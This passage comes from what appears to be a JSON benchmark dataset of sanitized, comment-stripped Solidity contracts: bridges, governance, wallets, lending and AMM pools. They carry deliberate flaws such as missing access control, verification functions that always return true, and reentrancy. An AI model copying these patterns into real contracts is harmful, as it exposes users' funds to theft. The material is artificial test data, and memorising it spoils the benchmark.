returns (bytes32) {\nif (_message.length > 32 && uint256(bytes32(_message)) == 0) {\nreturn bytes32(0);\n}\nreturn keccak256(_message);\n}\nfunction setAcceptedRoot(bytes32 _newRoot) external {\nacceptedRoot = _newRoot;\n}\n}",
      "rename_map": {},
      "changes": [
        "Applied compressed formatting"
      ],
      "stats": {
        "comments_removed": true,
        "blank_lines_removed": 20,
        "mode": "compressed",
        "original_lines": 85,
        "transformed_lines": 40,
        "original_chars": 2374,
        "transformed_chars": 1123,
        "compression_ratio": 0.47
      },
      "error": null
    },
    {
      "original_id": "sn_tc_002",
      "transformed_id": "ss_l1_compressed_sn_tc_002",
      "level": "l1",
      "variant": "compressed",
      "source": "sanitized",
      "success": true,
      "code": "pragma solidity ^0.8.0;\ninterface IDiamondCut {\nstruct FacetCut {\naddress facetAddress;\nuint8 action;\nbytes4[] functionSelectors;\n}\n}\ncontract GovernanceSystem {\nmapping(address => uint256) public depositedBalance;\nmapping(address => uint256) public votingPower;\nstruct Proposal {\naddress proposer;\naddress target;\nbytes data;\nuint256 forVotes;\nuint256 startTime;\nbool executed;\n}\nmapping(uint256 => Proposal) public proposals;\nmapping(uint256 => mapping(address => bool)) public hasVoted;\nuint256 public proposalCount;\nuint256 public totalVotingPower;\nuint256 constant EMERGENCY_THRESHOLD = 66;\nevent ProposalCreated(\nuint256 indexed proposalId,\naddress proposer,\naddress target\n);\nevent Voted(uint256 indexed proposalId, address voter, uint256 votes);\nevent ProposalExecuted(uint256 indexed proposalId);\nfunction deposit(uint256 amount) external {\ndepositedBalance[msg.sender] += amount;\nvotingPower[msg.sender] += amount;\ntotalVotingPower += amount;\n}\nfunction propose(\nIDiamondCut.FacetCut[] calldata,\naddress _target,\nbytes calldata _calldata,\nuint8\n) external returns (uint256) {\nproposalCount++;\nProposal storage prop = proposals[proposalCount];\nprop.proposer = msg.sender;\nprop.target = _target;\nprop.data = _calldata;\nprop.startTime = block.timestamp;\nprop.executed = false;\nprop.forVotes = votingPower[msg.sender];\nhasVoted[proposalCount][msg.sender] = true;\nemit ProposalCreated(proposalCount, msg.sender, _target);\nreturn proposalCount;\n}\nfunction vote(uint256 proposalId) external {\nrequire(!hasVoted[proposalId][msg.sender], \"Already voted\");\nrequire(!proposals[proposalId].executed, \"Already executed\");\nproposals[proposalId].forVotes += votingPower[msg.sender];\nhasVoted[proposalId][msg.sender] = true;\nemit Voted(proposalId, msg.sender, votingPower[msg.sender]);\n}\nfunction emergencyCommit(uint256 proposalId) external {\nProposal storage prop = proposals[proposalId];\nrequire(!prop.executed, \"Already executed\");\nuint256 votePercentage = (prop.forVotes * 100) / totalVotingPower;\nrequire(votePercentage >= EMERGENCY_THRESHOLD, \"Insufficient votes\");\nprop.executed = true;\n(bool success, ) = prop.target.call(prop.data);\nrequire(success, \"Execution failed\");\nemit ProposalExecuted(proposalId);\n}\n}",
      "rename_map": {},
      "changes": [
        "Applied compressed formatting"
      ],
      "stats": {
        "comments_removed": true,
        "blank_lines_removed": 23,
        "mode": "compressed",
        "original_lines": 122,
        "transformed_lines": 72,
        "original_chars": 3528,
        "transformed_chars": 2213,
        "compression_ratio": 0.63
      },
      "error": null
    },
    {
      "original_id": "sn_tc_003",
      "transformed_id": "ss_l1_compressed_sn_tc_003",
      "level": "l1",
      "variant": "compressed",
      "source": "sanitized",
      "success": true,
      "code": "pragma solidity ^0.8.0;\ncontract WalletLibrary {\nmapping(address => bool) public isOwner;\naddress[] public owners;\nuint256 public required;\nbool public initialized;\nevent OwnerAdded(address indexed owner);\nevent WalletDestroyed(address indexed destroyer);\nfunction initWallet(\naddress[] memory _owners,\nuint256 _required,\nuint256 _daylimit\n) public {\nfor (uint i = 0; i < owners.length; i++) {\nisOwner[owners[i]] = false;\n}\ndelete owners;\nfor (uint i = 0; i < _owners.length; i++) {\naddress owner = _owners[i];\nrequire(owner != address(0), \"Invalid owner\");\nrequire(!isOwner[owner], \"Duplicate owner\");\nisOwner[owner] = true;\nowners.push(owner);\nemit OwnerAdded(owner);\n}\nrequired = _required;\ninitialized = true;\n}\nfunction isOwnerAddress(address _addr) public view returns (bool) {\nreturn isOwner[_addr];\n}\nfunction kill(address payable _to) external {\nrequire(isOwner[msg.sender], \"Not an owner\");\nemit WalletDestroyed(msg.sender);\nselfdestruct(_to);\n}\nfunction execute(address to, uint256 value, bytes memory data) external {\nrequire(isOwner[msg.sender], \"Not an owner\");\n(bool success, ) = to.call{value: value}(data);\nrequire(success, \"Execution failed\");\n}\n}\ncontract WalletProxy {\naddress public libraryAddress;\nconstructor(address _library) {\nlibraryAddress = _library;\n}\nfallback() external payable {\naddress lib = libraryAddress;\nassembly {\ncalldatacopy(0, 0, calldatasize())\nlet result := delegatecall(gas(), lib, 0, calldatasize(), 0, 0)\nreturndatacopy(0, 0, returndatasize())\nswitch result\ncase 0 {\nrevert(0, returndatasize())\n}\ndefault {\nreturn(0, returndatasize())\n}\n}\n}\nreceive() external payable {}\n}",
      "rename_map": {},
      "changes": [
        "Applied compressed formatting"
      ],
      "stats": {
        "comments_removed": true,
        "blank_lines_removed": 23,
        "mode": "compressed",
        "original_lines": 119,
        "transformed_lines": 64,
        "original_chars": 3131,
        "transformed_chars": 1618,
        "compression_ratio": 0.52
      },
      "error": null
    },
    {
      "original_id": "sn_tc_004",
      "transformed_id": "ss_l1_compressed_sn_tc_004",
      "level": "l1",
      "variant": "compressed",
      "source": "sanitized",
      "success": true,
      "code": "pragma solidity ^0.8.0;\ninterface ICurvePool {\nfunction exchange_underlying(\nint128 i,\nint128 j,\nuint256 dx,\nuint256 min_dy\n) external returns (uint256);\nfunction get_dy_underlying(\nint128 i,\nint128 j,\nuint256 dx\n) external view returns (uint256);\n}\ncontract YieldVault {\naddress public underlyingToken;\nICurvePool public curvePool;\nuint256 public totalSupply;\nmapping(address => uint256) public balanceOf;\nuint256 public investedBalance;\nevent Deposit(address indexed user, uint256 amount, uint256 shares);\nevent Withdrawal(address indexed user, uint256 shares, uint256 amount);\nconstructor(address _token, address _curvePool) {\nunderlyingToken = _token;\ncurvePool = ICurvePool(_curvePool);\n}\nfunction deposit(uint256 amount) external returns (uint256 shares) {\nrequire(amount > 0, \"Zero amount\");\nif (totalSupply == 0) {\nshares = amount;\n} else {\nuint256 totalAssets = getTotalAssets();\nshares = (amount * totalSupply) / totalAssets;\n}\nbalanceOf[msg.sender] += shares;\ntotalSupply += shares;\n_investInCurve(amount);\nemit Deposit(msg.sender, amount, shares);\nreturn shares;\n}\nfunction withdraw(uint256 shares) external returns (uint256 amount) {\nrequire(shares > 0, \"Zero shares\");\nrequire(balanceOf[msg.sender] >= shares, \"Insufficient balance\");\nuint256 totalAssets = getTotalAssets();\namount = (shares * totalAssets) / totalSupply;\nbalanceOf[msg.sender] -= shares;\ntotalSupply -= shares;\n_withdrawFromCurve(amount);\nemit Withdrawal(msg.sender, shares, amount);\nreturn amount;\n}\nfunction getTotalAssets() public view returns (uint256) {\nuint256 vaultBalance = 0;\nuint256 curveBalance = investedBalance;\nreturn vaultBalance + curveBalance;\n}\nfunction getPricePerFullShare() public view returns (uint256) {\nif (totalSupply == 0) return 1e18;\nreturn (getTotalAssets() * 1e18) / totalSupply;\n}\nfunction _investInCurve(uint256 amount) internal {\ninvestedBalance += amount;\n}\nfunction _withdrawFromCurve(uint256 amount) internal {\nrequire(investedBalance >= amount, \"Insufficient invested\");\ninvestedBalance -= amount;\n}\n}",
      "rename_map": {},
      "changes": [
        "Applied compressed formatting"
      ],
      "stats": {
        "comments_removed": true,
        "blank_lines_removed": 24,
        "mode": "compressed",
        "original_lines": 127,
        "transformed_lines": 68,
        "original_chars": 3611,
        "transformed_chars": 2019,
        "compression_ratio": 0.56
      },
      "error": null
    },
    {
      "original_id": "sn_tc_005",
      "transformed_id": "ss_l1_compressed_sn_tc_005",
      "level": "l1",
      "variant": "compressed",
      "source": "sanitized",
      "success": true,
      "code": "pragma solidity ^0.8.0;\ncontract AMMPool {\nmapping(uint256 => uint256) public balances;\nmapping(address => uint256) public lpBalances;\nuint256 public totalLPSupply;\nuint256 private _status;\nuint256 private constant _NOT_ENTERED = 1;\nuint256 private constant _ENTERED = 2;\nevent LiquidityAdded(\naddress indexed provider,\nuint256[2] amounts,\nuint256 lpMinted\n);\nevent LiquidityRemoved(\naddress indexed provider,\nuint256 lpBurned,\nuint256[2] amounts\n);\nconstructor() {\n_status = _NOT_ENTERED;\n}\nfunction add_liquidity(\nuint256[2] memory amounts,\nuint256 min_mint_amount\n) external payable returns (uint256) {\nrequire(amounts[0] == msg.value, \"ETH amount mismatch\");\nuint256 lpToMint;\nif (totalLPSupply == 0) {\nlpToMint = amounts[0] + amounts[1];\n} else {\nuint256 totalValue = balances[0] + balances[1];\nlpToMint = ((amounts[0] + amounts[1]) * totalLPSupply) / totalValue;\n}\nrequire(lpToMint >= min_mint_amount, \"Slippage\");\nbalances[0] += amounts[0];\nbalances[1] += amounts[1];\nlpBalances[msg.sender] += lpToMint;\ntotalLPSupply += lpToMint;\nif (amounts[0] > 0) {\n_handleETHTransfer(amounts[0]);\n}\nemit LiquidityAdded(msg.sender, amounts, lpToMint);\nreturn lpToMint;\n}\nfunction remove_liquidity(\nuint256 lpAmount,\nuint256[2] memory min_amounts\n) external {\nrequire(lpBalances[msg.sender] >= lpAmount, \"Insufficient LP\");\nuint256 amount0 = (lpAmount * balances[0]) / totalLPSupply;\nuint256 amount1 = (lpAmount * balances[1]) / totalLPSupply;\nrequire(\namount0 >= min_amounts[0] && amount1 >= min_amounts[1],\n\"Slippage\"\n);\nlpBalances[msg.sender] -= lpAmount;\ntotalLPSupply -= lpAmount;\nbalances[0] -= amount0;\nbalances[1] -= amount1;\nif (amount0 > 0) {\npayable(msg.sender).transfer(amount0);\n}\nuint256[2] memory amounts = [amount0, amount1];\nemit LiquidityRemoved(msg.sender, lpAmount, amounts);\n}\nfunction _handleETHTransfer(uint256 amount) internal {\n(bool success, ) = msg.sender.call{value: 0}(\"\");\nrequire(success, \"Transfer failed\");\n}\nfunction exchange(\nint128 i,\nint128 j,\nuint256 dx,\nuint256 min_dy\n) external payable returns (uint256) {\nuint256 ui = uint256(int256(i));\nuint256 uj = uint256(int256(j));\nrequire(ui < 2 && uj < 2 && ui != uj, \"Invalid indices\");\nuint256 dy = (dx * balances[uj]) / (balances[ui] + dx);\nrequire(dy >= min_dy, \"Slippage\");\nif (ui == 0) {\nrequire(msg.value == dx, \"ETH mismatch\");\nbalances[0] += dx;\n}\nbalances[ui] += dx;\nbalances[uj] -= dy;\nif (uj == 0) {\npayable(msg.sender).transfer(dy);\n}\nreturn dy;\n}\nreceive() external payable {}\n}",
      "rename_map": {},
      "changes": [
        "Applied compressed formatting"
      ],
      "stats": {
        "comments_removed": true,
        "blank_lines_removed": 31,
        "mode": "compressed",
        "original_lines": 161,
        "transformed_lines": 93,
        "original_chars": 4395,
        "transformed_chars": 2468,
        "compression_ratio": 0.56
      },
      "error": null
    },
    {
      "original_id": "sn_tc_006",
      "transformed_id": "ss_l1_compressed_sn_tc_006",
      "level": "l1",
      "variant": "compressed",
      "source": "sanitized",
      "success": true,
      "code": "pragma solidity ^0.8.0;\ncontract CrossChainBridge {\naddress[] public validators;\nmapping(address => bool) public isValidator;\nuint256 public requiredSignatures = 5;\nuint256 public validatorCount;\nmapping(uint256 => bool) public processedWithdrawals;\nmapping(address => bool) public supportedTokens;\nevent WithdrawalProcessed(\nuint256 indexed withdrawalId,\naddress indexed user,\naddress indexed token,\nuint256 amount\n);\nconstructor(address[] memory _validators) {\nrequire(\n_validators.length >= requiredSignatures,\n\"Not enough validators\"\n);\nfor (uint256 i = 0; i < _validators.length; i++) {\naddress validator = _validators[i];\nrequire(validator != address(0), \"Invalid validator\");\nrequire(!isValidator[validator], \"Duplicate validator\");\nvalidators.push(validator);\nisValidator[validator] = true;\n}\nvalidatorCount = _validators.length;\n}\nfunction withdrawERC20For(\nuint256 _withdrawalId,\naddress _user,\naddress _token,\nuint256 _amount,\nbytes memory _signatures\n) external {\nrequire(!processedWithdrawals[_withdrawalId], \"Already processed\");\nrequire(supportedTokens[_token], \"Token not supported\");\nrequire(\n_verifySignatures(\n_withdrawalId,\n_user,\n_token,\n_amount,\n_signatures\n),\n\"Invalid signatures\"\n);\nprocessedWithdrawals[_withdrawalId] = true;\nemit WithdrawalProcessed(_withdrawalId, _user, _token, _amount);\n}\nfunction _verifySignatures(\nuint256 _withdrawalId,\naddress _user,\naddress _token,\nuint256 _amount,\nbytes memory _signatures\n) internal view returns (bool) {\nrequire(_signatures.length % 65 == 0, \"Invalid signature length\");\nuint256 signatureCount = _signatures.length / 65;\nrequire(signatureCount >= requiredSignatures, \"Not enough signatures\");\nbytes32 messageHash = keccak256(\nabi.encodePacked(_withdrawalId, _user, _token, _amount)\n);\nbytes32 ethSignedMessageHash = keccak256(\nabi.encodePacked(\"\\x19Ethereum Signed Message:\\n32\", messageHash)\n);\naddress[] memory signers = new address[](signatureCount);\nfor (uint256 i = 0; i < signatureCount; i++) {\nbytes memory signature = _extractSignature(_signatures, i);\naddress signer = _recoverSigner(ethSignedMessageHash, signature);\nrequire(isValidator[signer], \"Invalid signer\");\nfor (uint256 j = 0; j < i; j++) {\nrequire(signers[j] != signer, \"Duplicate signer\");\n}\nsigners[i] = signer;\n}\nreturn true;\n}\nfunction _extractSignature(\nbytes memory _signatures,\nuint256 _index\n) internal pure returns (bytes memory) {\nbytes memory signature = new bytes(65);\nuint256 offset = _index * 65;\nfor (uint256 i = 0; i < 65; i++) {\nsignature[i] = _signatures[offset + i];\n}\nreturn signature;\n}\nfunction _recoverSigner(\nbytes32 _hash,\nbytes memory _signature\n) internal pure returns (address) {\nrequire(_signature.length == 65, \"Invalid signature length\");\nbytes32 r;\nbytes32 s;\nuint8 v;\nassembly {\nr := mload(add(_signature, 32))\ns := mload(add(_signature, 64))\nv := byte(0, mload(add(_signature, 96)))\n}\nif (v < 27) {\nv += 27;\n}\nrequire(v == 27 || v == 28, \"Invalid signature v value\");\nreturn ecrecover(_hash, v, r, s);\n}\nfunction addSupportedToken(address _token) external {\nsupportedTokens[_token] = true;\n}\n}",
      "rename_map": {},
      "changes": [
        "Applied compressed formatting"
      ],
      "stats": {
        "comments_removed": true,
        "blank_lines_removed": 37,
        "mode": "compressed",
        "original_lines": 185,
        "transformed_lines": 112,
        "original_chars": 5298,
        "transformed_chars": 3067,
        "compression_ratio": 0.58
      },
      "error": null
    },
    {
      "original_id": "sn_tc_007",
      "transformed_id": "ss_l1_compressed_sn_tc_007",
      "level": "l1",
      "variant": "compressed",
      "source": "sanitized",
      "success": true,
      "code": "pragma solidity ^0.8.0;\ninterface ICrossChainData {\nfunction transferOwnership(address newOwner) external;\nfunction putCurEpochConPubKeyBytes(\nbytes calldata curEpochPkBytes\n) external returns (bool);\nfunction getCurEpochConPubKeyBytes() external view returns (bytes memory);\n}\ncontract CrossChainData {\naddress public owner;\nbytes public currentEpochPublicKeys;\nevent OwnershipTransferred(\naddress indexed previousOwner,\naddress indexed newOwner\n);\nevent PublicKeysUpdated(bytes newKeys);\nconstructor() {\nowner = msg.sender;\n}\nmodifier onlyOwner() {\nrequire(msg.sender == owner, \"Not owner\");\n_;\n}\nfunction putCurEpochConPubKeyBytes(\nbytes calldata curEpochPkBytes\n) external onlyOwner returns (bool) {\ncurrentEpochPublicKeys = curEpochPkBytes;\nemit PublicKeysUpdated(curEpochPkBytes);\nreturn true;\n}\nfunction transferOwnership(address newOwner) external onlyOwner {\nrequire(newOwner != address(0), \"Invalid address\");\nemit OwnershipTransferred(owner, newOwner);\nowner = newOwner;\n}\nfunction getCurEpochConPubKeyBytes() external view returns (bytes memory) {\nreturn currentEpochPublicKeys;\n}\n}\ncontract CrossChainManager {\naddress public dataContract;\nevent CrossChainEvent(\naddress indexed fromContract,\nbytes toContract,\nbytes method\n);\nconstructor(address _dataContract) {\ndataContract = _dataContract;\n}\nfunction verifyHeaderAndExecuteTx(\nbytes memory proof,\nbytes memory rawHeader,\nbytes memory headerProof,\nbytes memory curRawHeader,\nbytes memory headerSig\n) external returns (bool) {\nrequire(_verifyHeader(rawHeader, headerSig), \"Invalid header\");\nrequire(_verifyProof(proof, rawHeader), \"Invalid proof\");\n(\naddress toContract,\nbytes memory method,\nbytes memory args\n) = _decodeTx(proof);\n(bool success, ) = toContract.call(abi.encodePacked(method, args));\nrequire(success, \"Execution failed\");\nreturn true;\n}\nfunction _verifyHeader(\nbytes memory rawHeader,\nbytes memory headerSig\n) internal pure returns (bool) {\nreturn true;\n}\nfunction _verifyProof(\nbytes memory proof,\nbytes memory rawHeader\n) internal pure returns (bool) {\nreturn true;\n}\nfunction _decodeTx(\nbytes memory proof\n)\ninternal\nview\nreturns (address toContract, bytes memory method, bytes memory args) {\ntoContract = dataContract;\nmethod = abi.encodeWithSignature(\n\"putCurEpochConPubKeyBytes(bytes)\",\n\"\"\n);\nargs = \"\";\n}\n}",
      "rename_map": {},
      "changes": [
        "Applied compressed formatting"
      ],
      "stats": {
        "comments_removed": true,
        "blank_lines_removed": 24,
        "mode": "compressed",
        "original_lines": 150,
        "transformed_lines": 93,
        "original_chars": 3907,
        "transformed_chars": 2294,
        "compression_ratio": 0.59
      },
      "error": null
    },
    {
      "original_id": "sn_tc_008",
      "transformed_id": "ss_l1_compressed_sn_tc_008",
      "level": "l1",
      "variant": "compressed",
      "source": "sanitized",
      "success": true,
      "code": "pragma solidity ^0.8.0;\ninterface IOracle {\nfunction getUnderlyingPrice(address cToken) external view returns (uint256);\n}\ninterface ICToken {\nfunction mint(uint256 mintAmount) external;\nfunction borrow(uint256 borrowAmount) external;\nfunction redeem(uint256 redeemTokens) external;\nfunction underlying() external view returns (address);\n}\ncontract LendingProtocol {\nIOracle public oracle;\nmapping(address => uint256) public collateralFactors;\nmapping(address => mapping(address => uint256)) public userDeposits;\nmapping(address => mapping(address => uint256)) public userBorrows;\nmapping(address => bool) public supportedMarkets;\nevent Deposit(address indexed user, address indexed cToken, uint256 amount);\nevent Borrow(address indexed user, address indexed cToken, uint256 amount);\nconstructor(address _oracle) {\noracle = IOracle(_oracle);\n}\nfunction mint(address cToken, uint256 amount) external {\nrequire(supportedMarkets[cToken], \"Market not supported\");\nuserDeposits[msg.sender][cToken] += amount;\nemit Deposit(msg.sender, cToken, amount);\n}\nfunction borrow(address cToken, uint256 amount) external {\nrequire(supportedMarkets[cToken], \"Market not supported\");\nuint256 borrowPower = calculateBorrowPower(msg.sender);\nuint256 currentBorrows = calculateTotalBorrows(msg.sender);\nuint256 borrowValue = (oracle.getUnderlyingPrice(cToken) * amount) /\n1e18;\nrequire(\ncurrentBorrows + borrowValue <= borrowPower,\n\"Insufficient collateral\"\n);\nuserBorrows[msg.sender][cToken] += amount;\nemit Borrow(msg.sender, cToken, amount);\n}\nfunction calculateBorrowPower(address user) public view returns (uint256) {\nuint256 totalPower = 0;\naddress[] memory markets = new address[](2);\nfor (uint256 i = 0; i < markets.length; i++) {\naddress cToken = markets[i];\nuint256 balance = userDeposits[user][cToken];\nif (balance > 0) {\nuint256 price = oracle.getUnderlyingPrice(cToken);\nuint256 value = (balance * price) / 1e18;\nuint256 power = (value * collateralFactors[cToken]) / 1e18;\ntotalPower += power;\n}\n}\nreturn totalPower;\n}\nfunction calculateTotalBorrows(address user) public view returns (uint256) {\nuint256 totalBorrows = 0;\naddress[] memory markets = new address[](2);\nfor (uint256 i = 0; i < markets.length; i++) {\naddress cToken = markets[i];\nuint256 borrowed = userBorrows[user][cToken];\nif (borrowed > 0) {\nuint256 price = oracle.getUnderlyingPrice(cToken);\nuint256 value = (borrowed * price) / 1e18;\ntotalBorrows += value;\n}\n}\nreturn totalBorrows;\n}\nfunction addMarket(address cToken, uint256 collateralFactor) external {\nsupportedMarkets[cToken] = true;\ncollateralFactors[cToken] = collateralFactor;\n}\n}",
      "rename_map": {},
      "changes": [
        "Applied compressed formatting"
      ],
      "stats": {
        "comments_removed": true,
        "blank_lines_removed": 40,
        "mode": "compressed",
        "original_lines": 156,
        "transformed_lines": 73,
        "original_chars": 4612,
        "transformed_chars": 2599,
        "compression_ratio": 0.56
      },
      "error": null
    },
    {
      "original_id": "sn_tc_009",
      "transformed_id": "ss_l1_compressed_sn_tc_009",
      "level": "l1",
      "variant": "compressed",
      "source": "sanitized",
      "success": true,
      "code": "pragma solidity ^0.8.0;\ncontract ConcentratedLiquidityPool {\naddress public token0;\naddress public token1;\nuint160 public sqrtPriceX96;\nint24 public currentTick;\nuint128 public liquidity;\nmapping(int24 => int128) public liquidityNet;\nstruct Position {\nuint128 liquidity;\nint24 tickLower;\nint24 tickUpper;\n}\nmapping(bytes32 => Position) public positions;\nevent Swap(\naddress indexed sender,\nuint256 amount0In,\nuint256 amount1In,\nuint256 amount0Out,\nuint256 amount1Out\n);\nevent LiquidityAdded(\naddress indexed provider,\nint24 tickLower,\nint24 tickUpper,\nuint128 liquidity\n);\nfunction addLiquidity(\nint24 tickLower,\nint24 tickUpper,\nuint128 liquidityDelta\n) external returns (uint256 amount0, uint256 amount1) {\nrequire(tickLower < tickUpper, \"Invalid ticks\");\nrequire(liquidityDelta > 0, \"Zero liquidity\");\nbytes32 positionKey = keccak256(\nabi.encodePacked(msg.sender, tickLower, tickUpper)\n);\nPosition storage position = positions[positionKey];\nposition.liquidity += liquidityDelta;\nposition.tickLower = tickLower;\nposition.tickUpper = tickUpper;\nliquidityNet[tickLower] += int128(liquidityDelta);\nliquidityNet[tickUpper] -= int128(liquidityDelta);\nif (currentTick >= tickLower && currentTick < tickUpper) {\nliquidity += liquidityDelta;\n}\n(amount0, amount1) = _calculateAmounts(\nsqrtPriceX96,\ntickLower,\ntickUpper,\nint128(liquidityDelta)\n);\nemit LiquidityAdded(msg.sender, tickLower, tickUpper, liquidityDelta);\n}\nfunction swap(\nbool zeroForOne,\nint256 amountSpecified,\nuint160 sqrtPriceLimitX96\n) external returns (int256 amount0, int256 amount1) {\nrequire(amountSpecified != 0, \"Zero amount\");\nuint160 sqrtPriceX96Next = sqrtPriceX96;\nuint128 liquidityNext = liquidity;\nint24 tickNext = currentTick;\nwhile (amountSpecified != 0) {\n(\nuint256 amountIn,\nuint256 amountOut,\nuint160 sqrtPriceX96Target\n) = _computeSwapStep(\nsqrtPriceX96Next,\nsqrtPriceLimitX96,\nliquidityNext,\namountSpecified\n);\nsqrtPriceX96Next = sqrtPriceX96Target;\nint24 tickCrossed = _getTickAtSqrtRatio(sqrtPriceX96Next);\nif (tickCrossed != tickNext) {\nint128 liquidityNetAtTick = liquidityNet[tickCrossed];\nif (zeroForOne) {\nliquidityNetAtTick = -liquidityNetAtTick;\n}\nliquidityNext = _addLiquidity(\nliquidityNext,\nliquidityNetAtTick\n);\ntickNext = tickCrossed;\n}\nif (amountSpecified > 0) {\namountSpecified -= int256(amountIn);\n} else {\namountSpecified += int256(amountOut);\n}\n}\nsqrtPriceX96 = sqrtPriceX96Next;\nliquidity = liquidityNext;\ncurrentTick = tickNext;\nreturn (amount0, amount1);\n}\nfunction _addLiquidity(\nuint128 x,\nint128 y\n) internal pure returns (uint128 z) {\nif (y < 0) {\nz = x - uint128(-y);\n} else {\nz = x + uint128(y);\n}\n}\nfunction _calculateAmounts(\nuint160 sqrtPrice,\nint24 tickLower,\nint24 tickUpper,\nint128 liquidityDelta\n) internal pure returns (uint256 amount0, uint256 amount1) {\namount0 = uint256(uint128(liquidityDelta)) / 2;\namount1 = uint256(uint128(liquidityDelta)) / 2;\n}\nfunction _computeSwapStep(\nuint160 sqrtPriceCurrentX96,\nuint160 sqrtPriceTargetX96,\nuint128 liquidityCurrent,\nint256 amountRemaining\n)\ninternal\npure\nreturns (uint256 amountIn, uint256 amountOut, uint160 sqrtPriceNextX96) {\namountIn =\nuint256(amountRemaining > 0 ? amountRemaining : -amountRemaining) /\n2;\namountOut = amountIn;\nsqrtPriceNextX96 = sqrtPriceCurrentX96;\n}\nfunction _getTickAtSqrtRatio(\nuint160 sqrtPriceX96\n) internal pure returns (int24 tick) {\nreturn int24(int256(uint256(sqrtPriceX96 >> 96)));\n}\n}",
      "rename_map": {},
      "changes": [
        "Applied compressed formatting"
      ],
      "stats": {
        "comments_removed": true,
        "blank_lines_removed": 34,
        "mode": "compressed",
        "original_lines": 216,
        "transformed_lines": 138,
        "original_chars": 6097,
        "transformed_chars": 3383,
        "compression_ratio": 0.55
      },
      "error": null
    },
    {
      "original_id": "sn_tc_010",
      "transformed_id": "ss_l1_compressed_sn_tc_010",
      "level": "l1",
      "variant": "compressed",
      "source": "sanitized",
      "success": true,
      "code": "pragma solidity ^0.4.19;\ncontract CreditSystem {\nmapping(address => uint256) public credit;\nuint256 public balance;\nfunction deposit() public payable {\ncredit[msg.sender] += msg.value;\nbalance += msg.value;\n}\nfunction withdrawAll() public {\nuint256 oCredit = credit[msg.sender];\nif (oCredit > 0) {\nbalance -= oCredit;\nbool callResult = msg.sender.call.value(oCredit)();\nrequire(callResult);\ncredit[msg.sender] = 0;\n}\n}\nfunction getCredit(address user) public view returns (uint256) {\nreturn credit[user];\n}\n}",
      "rename_map": {},
      "changes": [
        "Applied compressed formatting"
      ],
      "stats": {
        "comments_removed": true,
        "blank_lines_removed": 6,
        "mode": "compressed",
        "original_lines": 31,
        "transformed_lines": 21,
        "original_chars": 758,
        "transformed_chars": 508,
        "compression_ratio": 0.67
      },
      "error": null
    },
    {
      "original_id": "sn_tc_011",
      "transformed_id": "ss_l1_compressed_sn_tc_011",
      "level": "l1",
      "variant": "compressed",
      "source": "sanitized",
      "success": true,
      "code": "pragma solidity ^0.8.0;\ninterface IERC777 {\nfunction transfer(address to, uint256 amount) external returns (bool);\nfunction balanceOf(address account) external view returns (uint256);\n}\ninterface IERC1820Registry {\nfunction setInterfaceImplementer(\naddress account,\nbytes32 interfaceHash,\naddress implementer\n) external;\n}\ncontract LendingPool {\nmapping(address => mapping(address => uint256)) public supplied;\nmapping(address => uint256) public totalSupplied;\nfunction supply(address asset, uint256 amount) external returns (uint256) {\nIERC777 token = IERC777(asset);\nrequire(token.transfer(address(this), amount), \"Transfer failed\");\nsupplied[msg.sender][asset] += amount;\ntotalSupplied[asset] += amount;\nreturn amount;\n}\nfunction withdraw(\naddress asset,\nuint256 requestedAmount\n) external returns (uint256) {\nuint256 userBalance = supplied[msg.sender][asset];\nrequire(userBalance > 0, \"No balance\");\nuint256 withdrawAmount = requestedAmount;\nif (requestedAmount == type(uint256).max) {\nwithdrawAmount = userBalance;\n}\nrequire(withdrawAmount <= userBalance, \"Insufficient balance\");\nIERC777(asset).transfer(msg.sender, withdrawAmount);\nsupplied[msg.sender][asset] -= withdrawAmount;\ntotalSupplied[asset] -= withdrawAmount;\nreturn withdrawAmount;\n}\nfunction getSupplied(\naddress user,\naddress asset\n) external view returns (uint256) {\nreturn supplied[user][asset];\n}\n}",
      "rename_map": {},
      "changes": [
        "Applied compressed formatting"
      ],
      "stats": {
        "comments_removed": true,
        "blank_lines_removed": 16,
        "mode": "compressed",
        "original_lines": 66,
        "transformed_lines": 45,
        "original_chars": 1760,
        "transformed_chars": 1370,
        "compression_ratio": 0.78
      },
      "error": null
    },
    {
      "original_id": "sn_tc_012",
      "transformed_id": "ss_l1_compressed_sn_tc_012",
      "level": "l1",
      "variant": "compressed",
      "source": "sanitized",
      "success": true,
      "code": "pragma solidity ^0.8.0;\ninterface IComptroller {\nfunction enterMarkets(\naddress[] memory cTokens\n) external returns (uint256[] memory);\nfunction exitMarket(address cToken) external returns (uint256);\nfunction getAccountLiquidity(\naddress account\n) external view returns (uint256, uint256, uint256);\n}\ncontract LendingProtocol {\nIComptroller public comptroller;\nmapping(address => uint256) public deposits;\nmapping(address => uint256) public borrowed;\nmapping(address => bool) public inMarket;\nuint256 public totalDeposits;\nuint256 public totalBorrowed;\nuint256 public constant COLLATERAL_FACTOR = 150;\nconstructor(address _comptroller) {\ncomptroller = IComptroller(_comptroller);\n}\nfunction depositAndEnterMarket() external payable {\ndeposits[msg.sender] += msg.value;\ntotalDeposits += msg.value;\ninMarket[msg.sender] = true;\n}\nfunction isHealthy(\naddress account,\nuint256 additionalBorrow\n) public view returns (bool) {\nuint256 totalDebt = borrowed[account] + additionalBorrow;\nif (totalDebt == 0) return true;\nif (!inMarket[account]) return false;\nuint256 collateralValue = deposits[account];\nreturn collateralValue >= (totalDebt * COLLATERAL_FACTOR) / 100;\n}\nfunction borrow(uint256 amount) external {\nrequire(amount > 0, \"Invalid amount\");\nrequire(address(this).balance >= amount, \"Insufficient funds\");\nrequire(isHealthy(msg.sender, amount), \"Insufficient collateral\");\nborrowed[msg.sender] += amount;\ntotalBorrowed += amount;\n(bool success, ) = payable(msg.sender).call{value: amount}(\"\");\nrequire(success, \"Transfer failed\");\nrequire(isHealthy(msg.sender, 0), \"Health check failed\");\n}\nfunction exitMarket() external {\nrequire(borrowed[msg.sender] == 0, \"Outstanding debt\");\ninMarket[msg.sender] = false;\n}\nfunction withdraw(uint256 amount) external {\nrequire(deposits[msg.sender] >= amount, \"Insufficient deposits\");\nrequire(!inMarket[msg.sender], \"Exit market first\");\ndeposits[msg.sender] -= amount;\ntotalDeposits -= amount;\npayable(msg.sender).transfer(amount);\n}\nreceive() external payable {}\n}",
      "rename_map": {},
      "changes": [
        "Applied compressed formatting"
      ],
      "stats": {
        "comments_removed": true,
        "blank_lines_removed": 23,
        "mode": "compressed",
        "original_lines": 87,
        "transformed_lines": 59,
        "original_chars": 2477,
        "transformed_chars": 2006,
        "compression_ratio": 0.81
      },
      "error": null
    },
    {
      "original_id": "sn_tc_013",
      "transformed_id": "ss_l1_compressed_sn_tc_013",
      "level": "l1",
      "variant": "compressed",
      "source": "sanitized",
      "success": true,
